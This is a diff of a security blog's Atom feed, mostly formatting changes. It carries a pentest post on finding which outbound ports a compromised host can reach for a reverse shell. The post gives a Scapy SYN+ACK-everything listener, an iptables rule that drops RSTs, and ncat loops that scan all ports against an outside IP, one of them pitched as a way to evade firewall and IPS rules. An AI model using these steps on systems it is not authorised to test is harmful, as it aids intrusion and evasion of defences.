@@ -1,59 +1,59 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-11-06T08:00:19-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Maycon Vitali</title><subtitle>I hack stuff!</subtitle><author><name>Maycon Vitali</name></author><entry xml:lang="en"><title type="html">Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell</title><link href="http://localhost:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html" rel="alternate" type="text/html" title="Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell" /><published>2019-11-06T00:00:00-03:00</published><updated>2019-11-06T00:00:00-03:00</updated><id>http://localhost:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en</id><content type="html" xml:base="http://localhost:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html">&lt;p&gt;Sometimes during the daily engagements, we access (e.g. RCE) hosts where we are unable to get a reverse shell on the standard ports due to firewall restrictions. In these cases, we have to find alternative ways to exfiltrate data (e.g. DNS) but, first of all, check if we don’t have access to any port.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2022-09-13T21:19:22-03:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Maycon Vitali</title><subtitle>I hack stuff!</subtitle><author><name>Maycon Vitali</name></author><entry xml:lang="en"><title type="html">Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell</title><link href="http://0.0.0.0:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html" rel="alternate" type="text/html" title="Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell" /><published>2019-11-06T00:00:00-03:00</published><updated>2019-11-06T00:00:00-03:00</updated><id>http://0.0.0.0:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en</id><content type="html" xml:base="http://0.0.0.0:4000/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html">&lt;p&gt;Sometimes during the daily engagements, we access (e.g. RCE) hosts where we are unable to get a reverse shell on the standard ports due to firewall restrictions. In these cases, we have to find alternative ways to exfiltrate data (e.g. DNS) but, first of all, check if we don’t have access to any port.&lt;/p&gt;
 
 &lt;p&gt;During a pentest, I came across this situation and as I was looking to practice my coding, I decided to implement a tool that would accept any connection that came (any port). It was useful to identify if the compromised host had any outgoing port exposed to the Internet.&lt;/p&gt;
 
 &lt;h3 id=&quot;trick&quot;&gt;Trick&lt;/h3&gt;
 
-&lt;p&gt;This trick is basically a python code that anwser &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN+ACK&lt;/code&gt; to any incoming &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt; package. Using the python Scapy library, it was possible to easly develop this mechaninsm, as you can see bellow:&lt;/p&gt;
+&lt;p&gt;This trick is basically a python code that anwser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN+ACK&lt;/code&gt; to any incoming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN&lt;/code&gt; package. Using the python Scapy library, it was possible to easly develop this mechaninsm, as you can see bellow:&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python3&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# SYN+ACK ALL - Written by Maycon Vitali&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#
+# SYN+ACK ALL - Written by Maycon Vitali
+#
+&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PacketCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;s&quot;&gt;&quot;[{}] SYN packet received from {} on port {}. Replying with SYN+ACK...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-                &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Y-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;m-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;[{}] SYN packet received from {} on port {}. Replying with SYN+ACK...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%Y-%m-%d %H:%M:%S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;c&quot;&gt;# Create the IP datagram exchanging the source and the destination&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Create the IP datagram exchanging the source and the destination
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     
-    &lt;span class=&quot;c&quot;&gt;# Create the TCP datagrana exchanging the ports annd adjusting the flags&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# and the seq/ack numbers.&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'SA'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Create the TCP datagrana exchanging the ports annd adjusting the flags
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# and the seq/ack numbers.
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;c&quot;&gt;# Do it!&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Do it!
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;c&quot;&gt;# Start the sniffing&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Start the sniffing
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;eth0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PacketCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(tcp[tcpflags] &amp;amp; tcp-syn != 0)&quot;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The the above code work properly, we need to avoid the Linux kernel to sennd &lt;code class=&quot;highlighter-rouge&quot;&gt;RST&lt;/code&gt; packades when it receives a &lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt; package to a closed port. It can be done usign the following &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; command:&lt;/p&gt;
+&lt;p&gt;The the above code work properly, we need to avoid the Linux kernel to sennd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RST&lt;/code&gt; packades when it receives a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN&lt;/code&gt; package to a closed port. It can be done usign the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt; command:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 root@hacknroll:~# iptables -L
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination
@@ -68,7 +68,7 @@ DROP       tcp  --  anywhere             anywhere             tcp flags:RST/RST
 
 &lt;p&gt;Having done that, just run our script to start receiving connection messages from the unknown hosts:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# ./synack-all.py
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@hacknroll:~# ./synack-all.py
 [2019-11-05 14:05:12] SYN packet received from 117.xxx.xxx.160 on port 445. Replying with SYN+ACK...
 [2019-11-05 14:05:41] SYN packet received from 193.xxx.xxx.46 on port 445. Replying with SYN+ACK...
 [2019-11-05 14:05:41] SYN packet received from 193.xxx.xxx.46 on port 445. Replying with SYN+ACK...
@@ -89,7 +89,7 @@ DROP       tcp  --  anywhere             anywhere             tcp flags:RST/RST
 
 &lt;p&gt;To verify if the host you have access has an specific outgoing port open (e.g. 80/tcp) to the internet, you can use the following command:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ncat -z -v 68.xxx.xxx.181 80
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ncat -z -v 68.xxx.xxx.181 80
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Connected to 68.xxx.xxx.181:80.
 Ncat: 0 bytes sent, 0 bytes received in 0.24 seconds.
@@ -97,7 +97,7 @@ Ncat: 0 bytes sent, 0 bytes received in 0.24 seconds.
 
 &lt;p&gt;And with little effort, you can scan all ports and validate which ports can go out to the Internet and then use them to get your desired reverse shell:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PORT &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;seq 65535&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 68.xxx.xxx.181 &lt;span class=&quot;nv&quot;&gt;$PORT&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PORT &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;65535&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 68.xxx.xxx.181 &lt;span class=&quot;nv&quot;&gt;$PORT&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
 &lt;/span&gt;Ncat: Connected to 68.xxx.xxx.181:80.
 Ncat: Connected to 68.xxx.xxx.181:443.
 Ncat: Connected to 68.xxx.xxx.181:3389.
@@ -107,7 +107,7 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 &lt;p&gt;In the above example, the TCP ports 80, 443, 3389 (rdp) and 8080 have outgoing access to the internet.&lt;/p&gt;
 
 &lt;p&gt;If you wanna increase the scan speed and avoid some firewall/ips rules, you can use the following trick provided by &lt;a href=&quot;https://twitter.com/usscastro?lang=pt&quot;&gt;@usscastro&lt;/a&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;seq 65535 | shuf | xargs &lt;span class=&quot;nt&quot;&gt;-P32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;@ sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ncat -z -v 68.xxx.xxx.181 @&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;65535 | &lt;span class=&quot;nb&quot;&gt;shuf&lt;/span&gt; | xargs &lt;span class=&quot;nt&quot;&gt;-P32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;@ sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ncat -z -v 68.xxx.xxx.181 @&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Connected
 Ncat: Connected to 68.xxx.xxx.181:3389.
 Ncat: Connected to 68.xxx.xxx.181:443.
 Ncat: Connected to 68.xxx.xxx.181:80.
@@ -124,7 +124,7 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 &lt;h3 id=&quot;referências&quot;&gt;Referências&lt;/h3&gt;
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;https://scapy.net&quot;&gt;Scapy Project&lt;/a&gt;&lt;/li&gt;
